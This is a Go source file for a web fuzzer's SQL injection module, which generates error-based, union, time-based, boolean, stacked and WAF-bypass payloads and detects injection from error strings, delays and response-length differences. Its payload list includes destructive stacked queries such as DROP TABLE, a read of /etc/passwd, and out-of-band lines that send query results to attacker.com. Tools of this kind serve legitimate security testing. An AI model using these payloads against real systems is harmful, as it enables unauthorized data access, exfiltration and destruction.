package vulns

import (
	"fmt"
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

type SQLiModule struct{}

func (m *SQLiModule) Name() string        { return "sqli" }
func (m *SQLiModule) Description() string { return "SQL Injection (error, blind, time, union, stacked)" }

func (m *SQLiModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload

	raw := sqliPayloads()

	for _, point := range points {
		for _, p := range raw {
			payloads = append(payloads, mutator.Payload{
				Value:   p.value,
				Point:   point,
				Module:  "sqli",
				Variant: p.variant,
			})
			// Encoding variants para bypass de WAF
			if mode == "smart" || mode == "mutate" {
				for _, encoded := range mutator.EncodeVariants(p.value) {
					if encoded != p.value {
						payloads = append(payloads, mutator.Payload{
							Value:   encoded,
							Point:   point,
							Module:  "sqli",
							Variant: p.variant + "+encoded",
						})
					}
				}
			}
		}
	}
	return payloads
}

func (m *SQLiModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	// Error-based detection
	sqlErrors := []string{
		"you have an error in your sql syntax",
		"warning: mysql",
		"unclosed quotation mark",
		"quoted string not properly terminated",
		"microsoft ole db provider for sql server",
		"ora-01756", "ora-00933", "ora-01747",
		"pg_query", "pg_exec", "postgresql",
		"sqlite3.operationalerror", "sqlite_error",
		"sqlstate[", "sql syntax",
		"mysql_fetch", "mysql_num_rows",
		"supplied argument is not a valid mysql",
		"syntax error at or near",
		"unterminated quoted string",
		"invalid query", "odbc sql server driver",
		"microsoft access driver",
		"jet database engine",
		"org.hibernate", "javax.persistence",
		"com.mysql.jdbc", "java.sql.sqlexception",
		"near \"syntax\"", "incorrect syntax near",
	}

	bodyLower := strings.ToLower(respBody)
	for _, errStr := range sqlErrors {
		if strings.Contains(bodyLower, errStr) {
			return &Finding{
				Module:      "sqli",
				Severity:    "critical",
				Confidence:  "high",
				Title:       "SQL Injection - Error-based",
				Description: "Server returned SQL error indicating injection",
				Payload:     payload.Value,
				Point:       payload.Point,
				Evidence:    errStr,
				OWASP:       "A03:2021 Injection",
				CWE:         "CWE-89",
			}
		}
	}

	// Time-based detection (>5s diferença)
	if strings.Contains(payload.Variant, "time") && respTime-baseTime > 4500 {
		return &Finding{
			Module:      "sqli",
			Severity:    "critical",
			Confidence:  "high",
			Title:       "SQL Injection - Time-based Blind",
			Description: "Significant delay detected indicating time-based SQL injection",
			Payload:     payload.Value,
			Point:       payload.Point,
			Evidence:    fmt.Sprintf("baseline=%dms, response=%dms, delta=%dms", baseTime, respTime, respTime-baseTime),
			OWASP:       "A03:2021 Injection",
			CWE:         "CWE-89",
		}
	}

	// Boolean-based (body length diff significativo com payloads true/false)
	if strings.Contains(payload.Variant, "boolean") {
		baseLen := len(baseBody)
		respLen := len(respBody)
		diff := abs(respLen - baseLen)
		if diff > 50 && respStatus == baseStatus {
			return &Finding{
				Module:      "sqli",
				Severity:    "high",
				Confidence:  "medium",
				Title:       "SQL Injection - Boolean-based Blind (possible)",
				Description: "Significant response size difference with boolean SQLi payload",
				Payload:     payload.Value,
				Point:       payload.Point,
				Evidence:    fmt.Sprintf("baseline_len=%d, response_len=%d, diff=%d", baseLen, respLen, diff),
				OWASP:       "A03:2021 Injection",
				CWE:         "CWE-89",
			}
		}
	}

	return nil
}

type sqliPayload struct {
	value   string
	variant string
}

func sqliPayloads() []sqliPayload {
	return []sqliPayload{
		// Error-based
		{`'`, "error"},
		{`"`, "error"},
		{`' OR '1'='1`, "error"},
		{`" OR "1"="1`, "error"},
		{`' OR 1=1--`, "error"},
		{`" OR 1=1--`, "error"},
		{`' OR 1=1#`, "error"},
		{`') OR ('1'='1`, "error"},
		{`')) OR (('1'='1`, "error"},
		{`1' ORDER BY 1--`, "error"},
		{`1' ORDER BY 100--`, "error"},
		{`' UNION SELECT NULL--`, "error-union"},
		{`' UNION SELECT NULL,NULL--`, "error-union"},
		{`' UNION SELECT NULL,NULL,NULL--`, "error-union"},
		{`1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--`, "error-union"},
		{`' UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7071,0x41,0x7162706b71)--`, "error-union"},
		{`1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--`, "error-xml"},
		{`1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--`, "error-xml"},
		{`1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)`, "error-double"},

		// Time-based
		{`' OR SLEEP(5)--`, "time"},
		{`" OR SLEEP(5)--`, "time"},
		{`' OR pg_sleep(5)--`, "time"},
		{`'; WAITFOR DELAY '0:0:5'--`, "time"},
		{`1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`, "time"},
		{`' OR BENCHMARK(5000000,SHA1('test'))--`, "time"},
		{`1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`, "time"},
		{`' AND 1=IF(1=1,SLEEP(5),0)--`, "time"},
		{`')) OR SLEEP(5)--`, "time"},

		// Boolean-based
		{`' AND '1'='1`, "boolean"},
		{`' AND '1'='2`, "boolean"},
		{`' AND 1=1--`, "boolean"},
		{`' AND 1=2--`, "boolean"},
		{`1 AND 1=1`, "boolean"},
		{`1 AND 1=2`, "boolean"},
		{`' OR SUBSTRING(@@version,1,1)='5`, "boolean"},
		{`' AND (SELECT COUNT(*) FROM information_schema.tables)>0--`, "boolean"},

		// Stacked queries
		{`'; DROP TABLE test--`, "stacked"},
		{`'; SELECT 1;--`, "stacked"},
		{`1; SELECT pg_sleep(5);--`, "stacked"},

		// Out-of-band (OOB)
		{`' UNION SELECT LOAD_FILE('/etc/passwd')--`, "oob"},
		{`'; EXEC xp_cmdshell('nslookup attacker.com')--`, "oob-mssql"},
		{`' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--`, "oob-oracle"},

		// WAF bypass
		{`' /*!50000OR*/ 1=1--`, "waf-bypass"},
		{`' OR/**/ 1=1--`, "waf-bypass"},
		{`' %4fR 1=1--`, "waf-bypass"},
		{`'/**/UNION/**/SELECT/**/NULL--`, "waf-bypass"},
		{`' uNiOn SeLeCt NuLl--`, "waf-bypass"},
		{`' OR 1=1-- -`, "waf-bypass"},
		{`'||'1'='1`, "waf-bypass"},
		{`' OR 'x'='x`, "waf-bypass"},
		{`'\x27 OR 1=1--`, "waf-bypass"},
		{`%27%20OR%201%3D1--`, "waf-bypass"},
	}
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}
